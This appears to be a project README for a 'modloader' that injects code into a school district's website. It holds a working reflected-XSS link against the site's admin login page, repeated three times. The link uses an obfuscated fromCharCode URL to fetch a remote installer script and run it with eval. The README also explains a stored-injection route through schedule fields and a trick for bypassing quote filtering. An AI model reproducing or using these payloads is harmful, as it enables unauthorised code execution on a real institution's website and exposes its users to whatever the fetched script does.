# RHS-Modloader
An extension for the RHS website allowing you to install plugins and code. This is done by taking advantage of multiple HTML injection bugs in the website.

Supported on every device. An electron app will also be added to the releases tab at some point.
The Modloader itself will automatically update, but the electron app might need some app level changes to push to releases

***-- COOKIES WILL NOT WORK ON DAYS WITHOUT SCHOOL --***
[RHS Modloader website](https://app.ridgewood.k12.nj.us/admin/index.php?username=&error=<script>fetch(String.fromCharCode(104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,80,111,121,79,122,107,47,82,72,83,45,77,111,100,108,111,97,100,101,114,47,109,97,105,110,47,105,110,115,116,97,108,108,101,114,46,106,115)).then(response=>response.text()).then(d=>eval(d))</script>)

# Installing

Go [here](https://app.ridgewood.k12.nj.us/admin/index.php?username=&error=<script>fetch(String.fromCharCode(104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,80,111,121,79,122,107,47,82,72,83,45,77,111,100,108,111,97,100,101,114,47,109,97,105,110,47,105,110,115,116,97,108,108,101,114,46,106,115)).then(response=>response.text()).then(d=>eval(d))</script>) and click the big circle. That's it. A plugin store is being developed, but feel free to create your own and make a PR adding the plugin into this repo.

# Features
- Completely custom theme/plugin support using js/css
- Saving state of enabled plugins/themes
- CTRL + Y keybind to wipe everything in the case of something going wrong
- As this is unfinished, this is not the full list of features. more will be added soon.

# OLD INSTALLATION METHOD

~~As of right now, while it is less automatic, copying the code manaully is much more stable than attempting to change the domain's cookies, so this is reccomended for the time being.~~
USE THE REGULAR INSTALLATION METHOD!

1. Go to the [RHS Modloader website](https://app.ridgewood.k12.nj.us/admin/index.php?username=&error=<script>fetch(String.fromCharCode(104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,80,111,121,79,122,107,47,82,72,83,45,77,111,100,108,111,97,100,101,114,47,109,97,105,110,47,105,110,115,116,97,108,108,101,114,46,106,115)).then(response=>response.text()).then(d=>eval(d))</script>) and click "Copy Code Manually".

2. Go back to the official RHS Website and edit your schedule. If school is not happening on that day, you can change the date by adding ``?date=(year)-(month)-(day)`` to the end of the URL. 

*Month and day must be two digit, so for example use "03" instead of "3"*

3. To the end of every period name, paste the code you have copied. If that period is not present on a day, the code for it will not run. While putting it on 3 or 4 periods would also work for most days, there are some days with weird schedules. If done correctly, you won't see the code again.

# How this works

I have found two ways to add HTML onto the RHS website:

- Through the admin website
- By storing HTML in cookies

These are both forms of XSS as they allow self script injection.

The admin login for the RHS Website lets you directly add code to it using the [URL's error message](https://app.ridgewood.k12.nj.us/admin/index.php?username=&error=%3Ch1%3EHello%20RHS!%3C/h1%3E),
and the main website allows it through the schedule tab, which just adds it on as plain text. This is also stored as cookies instead of in the URL, where your schedule is also stored.

While both of these don't like it when you add code directly (they cancel quotes), making strings from char codes is a very nice alternative and runs well.
